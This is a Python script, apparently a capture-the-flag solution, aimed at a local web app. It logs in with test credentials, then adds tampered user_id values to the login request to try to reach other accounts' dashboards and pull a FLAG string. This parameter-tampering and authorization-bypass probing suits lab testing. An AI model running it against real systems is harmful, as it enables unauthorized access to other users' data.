import requests
import re
from http.cookies import SimpleCookie

BASE_URL = "http://127.0.0.1:32883"
PASSWORD_TEST_URL = f"{BASE_URL}/password/test"
DASHBOARD_URL = f"{BASE_URL}/dashboard"

print("[*] Following proper authentication and session flow\n")

# Step 1: Authenticate and capture session cookie
print("[STEP 1] Authenticate with test:test")
session = requests.Session()  # Use session to automatically handle cookies

auth_data = {
    'username': 'test',
    'password': 'test'
}

auth_response = session.post(PASSWORD_TEST_URL, data=auth_data, allow_redirects=False)
print(f"Auth Status: {auth_response.status_code}")
print(f"Auth Headers: {dict(auth_response.headers)}")
print(f"Session Cookies: {dict(session.cookies)}")

# Extract session cookie
if 'Set-Cookie' in auth_response.headers:
    print(f"Set-Cookie header: {auth_response.headers['Set-Cookie']}")

print("\n" + "="*60 + "\n")

# Step 2: Follow redirect to dashboard
print("[STEP 2] Follow redirect to dashboard")
dashboard_response = session.get(DASHBOARD_URL, allow_redirects=True)
print(f"Dashboard Status: {dashboard_response.status_code}")
print(f"Dashboard URL: {dashboard_response.url}")
print(f"Response length: {len(dashboard_response.text)}B")
print(f"\n[+] Full Dashboard Response:")
print(dashboard_response.text)

# Search for FLAG
flag_match = re.search(r'FLAG\{[^}]+\}', dashboard_response.text)
if flag_match:
    print(f"\n{'='*60}")
    print(f"[!] FLAG FOUND: {flag_match.group(0)}")
    print(f"{'='*60}\n")

print("\n" + "="*60 + "\n")

# Step 3: Try authenticating with user_id manipulation
print("[STEP 3] Test user_id parameter manipulation")

test_user_ids = [1, 10000, 10001, 10032, 99999, 0, -1]

for user_id in test_user_ids:
    print(f"\n[TEST] user_id={user_id}")
    
    # Create new session for each test
    test_session = requests.Session()
    
    auth_data_with_id = {
        'username': 'test',
        'password': 'test',
        'user_id': str(user_id)
    }
    
    auth_resp = test_session.post(PASSWORD_TEST_URL, data=auth_data_with_id, allow_redirects=False)
    print(f"  Auth Status: {auth_resp.status_code}")
    
    if auth_resp.status_code == 302:
        # Follow to dashboard
        dash_resp = test_session.get(DASHBOARD_URL, allow_redirects=True)
        print(f"  Dashboard Status: {dash_resp.status_code}")
        print(f"  Dashboard Length: {len(dash_resp.text)}B")
        
        # Check for FLAG
        flag = re.search(r'FLAG\{[^}]+\}', dash_resp.text)
        if flag:
            print(f"  [!] FLAG FOUND: {flag.group(0)}")
            print(f"\n  Full response:\n{dash_resp.text}")
        
        # Check for unique content
        if "FLAG" in dash_resp.text or "admin" in dash_resp.text.lower():
            print(f"  [+] Interesting content found!")
            print(f"  Snippet: {dash_resp.text[:500]}")

